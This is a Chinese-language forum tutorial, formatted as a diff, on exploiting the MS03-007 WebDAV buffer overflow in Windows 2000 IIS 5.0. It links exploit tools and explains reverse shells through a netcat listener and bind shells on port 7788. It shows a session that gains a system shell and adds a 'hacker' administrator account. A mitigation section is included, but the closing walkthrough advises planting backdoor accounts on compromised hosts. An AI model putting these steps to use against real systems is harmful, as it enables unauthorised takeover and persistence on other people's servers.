@@ -1,0 +1,104 @@
+
+webdav漏洞的利用
+
+一、 漏洞基本情况
+1、 漏洞名称及描述
+名称：Microsoft Windows 2000 WebDAV远程缓冲区溢出漏洞
+微软安全公告：MS03-007
+Unchecked Buffer In Windows Component Could Cause Web Server Compromise(815021)
+地址[url=http://www.microsoft.com/technet/security/bulletin/MS03-007.asp]链接标记http://www.microsoft.com/technet/security/bulletin/MS03-007.asp[/url]
+描述：IIS 5.0包含的WebDAV组件不充分检查传递给部分系统组件的数据，远程攻击者利用这个漏洞
+对WebDAV进行缓冲区溢出攻击，可能以Web进程权限在系统上执行任意指令。
+2、 受影响系统 
+Microsoft IIS 5.0 
+- Microsoft Windows 2000 Professional/Server/ 
+Datacenter Server SP3 
+- Microsoft Windows 2000 Professional/Server/ 
+Datacenter Server SP2 
+- Microsoft Windows 2000 Professional/Server/ 
+Datacenter Server SP1 
+- Microsoft Windows 2000 Professional/Server/ 
+Datacenter Server 
+3、 什么是WebDAV组件
+Microsoft IIS 5.0 (Internet Information Server 5)是Microsoft Windows 2000自带的一个网络
+信息服务器，其中包含HTTP服务功能。IIS5默认提供了对WebDAV的支持，WebDAV（基于Web的分布式写作和改写）是一组对HTTP协议的扩展，它允许用户协作地编辑和管理远程Web服务器上的文件。使用WebDAV，可以通过HTTP向用户提供远程文件存储的服务，包括创建、移动、复制及删除远程服务器上的文件，但是作为普通的HTTP服务器，这个功能不是必需的。
+4、 漏洞产生的原因
+这个漏洞产生的原因具体是由于WebDAV使用了ntdll.dll中的一些API函数，而这些函数存在一个缓
+冲区溢出漏洞，而Microsoft IIS 5.0带有WebDAV组件对用户输入的传递给ntdll.dll程序处理的请求未作充分的边界检查，远程入侵者可以通过向WebDAV提交一个精心构造的超长的数据请求而导致发生缓冲区溢出，成功利用这个漏洞可以获得LocalSystem权限，这意味着入侵者可以获得主机的安全控制能力。所以确切地说，这个漏洞并不是IIS造成的，而是ntdll.dll里面的一个API函数造成的。也就是说，很多调用这个API的应用程序都存在这个漏洞。
+5、 测试代码：见附件
+WebDAV远程缓冲区溢出漏洞的基本情况我们这里介绍到这里了，如果读者有兴趣想进一步了解这个漏
+洞具体的溢出原理分析，建议可以去安全焦[url=http://www.xfocus.net/]链接标记http://www.xfocus.net/[/url]中参阅isno写的两篇关于WebDAV远程溢出漏洞分析的文章，很精彩！我这里就不班门弄斧了。 
+二、如何检测漏
+在上面介绍漏洞基本情况的时候，我们已经说了IIS 5.0的默认配置是提供了对WebDAV的支持，也就是说，如果你的win 2000提供了IIS服务而没有打过针对此漏洞的补丁，那么一般情况下你的IIS就会存在这个漏洞，但如何来确定呢？我们可以借助一些工具来帮我们进行检测。
+1、 第一个检测工具：Ptwebdav.exe
+下载地址[url=http://www.ttian.net/txt/show.php?id=10]链接标记http://www.ttian.net/txt/show.php?id=10[/url]
+简介：Ptwebdav.exe是一个老外写的专门用来远程检测Windows 2000 IIS 5.0服务器是否存在WebDAV
+远程缓冲区溢出漏洞的东东，其操作界面非常简单，只要在其"IP or hostname"中填入要检测的主机和IIS服务端口，然后按"check"就可以了。笔者正用它来检测本地主机是否存在WebDAV漏洞，一会儿它就会在下面窗口里显示结果。这个工具不错，但它每次只能检测一台机子，如果你想检测一个网段内所有主机就比较麻烦了，一台台地检测不知道要检测到什么时候。让我们来看看第二个检测软件，它能帮我们解决这个问题。
+2、 第二个检测工具：WebDAVScan v1.0
+下载地址[url=http://www.cnhonker.net/Down/show.php?id=65&]链接标记http://www.cnhonker.net/Down/show.php?id=65&[/url];;down=1
+简介：WebDAVScan是一个专门用于检测网段内的Microsoft IIS 5.0服务器是否提供了对WebDAV的
+支持的扫描器，软件非常小，只有7.23KB，而且是个绿色软件，无须安装，直接运行即可！扫描后如有此安全漏洞，软件会自动生成扫描报告，原来也是老外写的，不过我们这里用的是WebDAVScan的汉化版。笔者扫描X.X.23.1-X.X.23.254的网段大概用了30秒时间，速度很快，窗口右边显示的是结果，"Enable"表示了此IIS支持WebDAV，至于有没有漏洞要看它有没有打过补丁了。经笔者测试，这个软件确实很不错，推荐大家使用，好了，WebDAV的检测也介绍完了，下面我们开始讲利用此漏洞测试攻击了。
+二、 漏洞测试攻击
+自从WebDAV的exploit代码出现后，网上紧接着就出现了好几种版本的溢出攻击程序，虽然其核心
+代码类似，但具体的功能和操作还是有些区别的，我们这里来了解两个WebDAV的溢出攻击程序。
+1、 第一个溢出程序：wb.exe
+下载地址[url=http://www.longker.com/txt/opensoft.asp?soft_id=131&]链接标记http://www.longker.com/txt/opensoft.asp?soft_id=131&[/url];;url=1
+简介：wb.exe是一个win32平台下已经编译好的针对英文版的IIS--webdav远程溢出攻击
+程序，原代码的作者是Crpt的kralor，使用时行用Netcat在本地监听某个端口，如nc -L -p 666，然后使用此程序对远程主机进行溢出攻击，溢出成功后就能在本地监听口上获取远程主机的反向连接，获取localsystem权限的cmdshell，它需要指定远程主机反向连接主机IP、端口、补丁信息等参数：syntax: c:\K_WEBDAV.EXE<victim_host><your_host><your_port>[padding]，如wb targetserver.com your_ip 666 3 ，攻击如果成功，那Netcat的监听窗口就会出现远程主机的shell。
+2、 第二个溢出程序：webdavx.exe
+下载地址[url=http://www.longker.dom/txt/opensoft.asp?soft_id=135&]链接标记http://www.longker.dom/txt/opensoft.asp?soft_id=135&[/url];;url=1
+简介：webdavx.exe是一个针对中文版server溢出程序，它是根据安全焦点Isno的perl代码编译成
+的，这个版本只对中文版的有效，它的使用也不同于wb.exe，它溢出成功后直接在目标主机的7788端口上捆定一个localsystem权限的cmdshell，不像wb.exe需要反向连接，入侵者只要telnet到7788端口就可以了，所以用它在局域网内也能对局域网的主机进行攻击，当然wb.exe使用反向连接也有它的好处，因为许多WEB服务器的防火墙都设置为只允许通过到端口80的TCP连接，这样即使开了7788端口你也连接不上，而使用反向连接可以突破防火墙的TCP过滤，所以这两个软件各有用处各有特点，可以根据不同的需要进行选择
+3、 测试攻击实例
+虽然讲了两个攻击软件的用法，但都只是纸上谈兵，我们还是来实际测试一下这个漏洞的威力如何！
+我们测试的是中文版的IIS主机，使用的扫描软件是WebDAVScan的汉化版，攻击软件是webdavx.exe，为了输入方便，我把webdavx.exe改名为web.exe，在刚才介绍WebDAVScan 的时候我们已经扫描到的IIS支持WebDAV的主机中选一台，找开CMD,输入：
+c:\web 2x..x.23.68 
+send buffer…(正在溢出)
+telnet target 7788(溢出完成，请尝试telnet连接目标主机的7788端口)
+c:\telnet 2x..x.23.68 7788 
+正在连接到2x..x.23.68… 
+Microsoft Windows 2000[Version 5.00.2195] 
+<C>版权所有制1985-2000Microsoft Corp 
+c:\winnt\system32> (溢出成功，已经连接到其7788端口) 
+当然事情上溢出不一定成功，如果telnet连接提示失败就说明溢出可能不成功，这里是笔者N次试验的结果，不过现在webdavx.exe的溢出代码重新进行了改进，其溢出成功率大幅提高，估计在1/2左右。而且得到的应该是system权限，比超级用户还高一级，可以加个administrator组的成员来试试：
+c:\winnt\system32>net user hacker 111111 /add 
+The command completed successfully
+C:\winnt\system32>net localgroup administrators hacker /add
+The command completed successfully
+命令成功了，看来System权限是真的了，那不是可在机器上干任何事情了？还真有点可怕！好了，我们这里只是测试，到此就停止吧！
+三、 漏洞消除方案
+我们上面已经看到了WebDAV远程溢出攻击的威力了吧，而到本文截稿为止，国内网络上的WebDAV远
+程溢出攻击是越来越多了，你的IIS服务器一不小心就有可能被黑客攻击而成为被控制的傀儡，所以管理员和用户们千万不能大意，一定要尽快地堵上这个漏洞，千万不能再重演像MSSQL的远程溢出漏洞那样的惨痛教训了。具体的可以通过以下几个方案来解决：
+⑴ 安装补丁，目前微软已经提供了此漏洞的补丁，下载地址[url=http://microsoft.com/downloads/]链接标记http://microsoft.com/downloads/[/url]
+details.aspx?FamilyId=C9A38D45-5145-4844-B62E-C69D32AC929B&displaylang=en 
+或者，你也可以作用微软提供的IIS Lockdown工具来防止该漏洞被利用。 
+⑵ 如果你不能立刻安装补丁或升级，也可以手工修补这个漏洞，我们上面已经说了WebDAV功能对一般的Web服务器来说并不需要，所以可以把它停止掉。WebDAV在IIS 5.0 WEB服务器上的实现是由Httpext.dll完成，默认安装，但是简单更改Httpext.ell不能修正此漏洞，因为WINDOWS 2000的WFP功能会防止系统重要文件破坏或删除。要完全关闭WebDAV包括的PUT和DELETE请求，需要对注册表进行如下更改：
+启动注册表编辑器，搜索注册表中的如下键：
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters 
+找到后点击"编辑"菜单，点击"增加值"，然后增加如下注册表键值：
+value name: DisableWebDAV　　　　
+Data typeWORD
+value data: 1
+最后别忘了重新启动IIS，只有重启IIS后新的设置才会生成
+我们的实验是用webdavscan配合cnwebdavx3.exe来做的
+接着我们开始操作—首先我们使用的是webdavscan.exe来扫描出有哪些漏洞
+首先打开软件，在上面输入要扫描的范围,我的Ip在192.168.1.1-192.1681.254把它填上去
+[url=http://down.qiannao.com/space/show/qiannao/share/2009/8/28/1.png/.page]链接标记[img]http://pic.qiannao.com:83/servlet/ReadFileStream?filename=//qiannao/share/2009/8/28/1.png[/img][/url]
+然后开始扫
+[url=http://down.qiannao.com/space/show/qiannao/share/2009/8/28/2.png/.page]链接标记[img]http://pic.qiannao.com:83/servlet/ReadFileStream?filename=//qiannao/share/2009/8/28/2.png[/img][/url]
+这里只有229和111是microsoft-iis/5.0的，这里我就选择229,我的虚拟机来做吧
+接着下面我们用到的工具就是webdavx3.exe
+这个软件是用命令行的，为了输入方便，我已经将他拷贝到d:\3\webdavx3.exe
+接着我为大家操作一下吧
+先看看它的帮助，来看一下它的格式
+[url=http://down.qiannao.com/space/show/qiannao/share/2009/8/28/3.png/.page]链接标记[img]http://pic.qiannao.com:83/servlet/ReadFileStream?filename=//qiannao/share/2009/8/28/3.png[/img][/url]
+接着就可以在目标IP上输入我的虚拟机IP192.168.1.229
+接着的效果就是
+[url=http://down.qiannao.com/space/show/qiannao/share/2009/8/28/4.png/.page]链接标记[img]http://pic.qiannao.com:83/servlet/ReadFileStream?filename=//qiannao/share/2009/8/28/4.png[/img][/url]
+说明我们溢出成功，然后按住CTRL+C退出
+接着就telnet对方的IP，端口是默认的7788
+[url=http://down.qiannao.com/space/show/qiannao/share/2009/8/28/5.png/.page]链接标记[img]http://pic.qiannao.com:83/servlet/ReadFileStream?filename=//qiannao/share/2009/8/28/5.png[/img][/url]
+看到没，　我进入对方的主机。
+进入对方主机后，接下来就好说了，一般我们进入对方主机后接下来的步骤就是留后门，方便我们以后的进入。
+在这里就说简单的
+就是建立后门帐户，然后提升权限。
